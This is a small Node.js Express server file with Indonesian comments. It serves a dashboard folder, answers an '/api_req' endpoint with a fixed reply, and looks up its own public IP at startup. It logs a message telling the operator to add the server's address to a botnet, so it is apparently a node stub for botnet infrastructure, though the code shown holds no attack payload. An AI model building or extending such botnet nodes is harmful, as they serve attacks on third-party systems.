const express = require('express');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Untuk serve folder public
const path = require('path');
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Endpoint request API
app.get('/api_req', (req, res) => {
  res.json({ status: 'Received' });
});

// Fetch IP public
async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Failed to fetch public IP:', error);
  }
}

// Mulai server
app.listen(port, '0.0.0.0', () => {
  console.log(`Server is running on port ${port}`);
  fetchData();
});
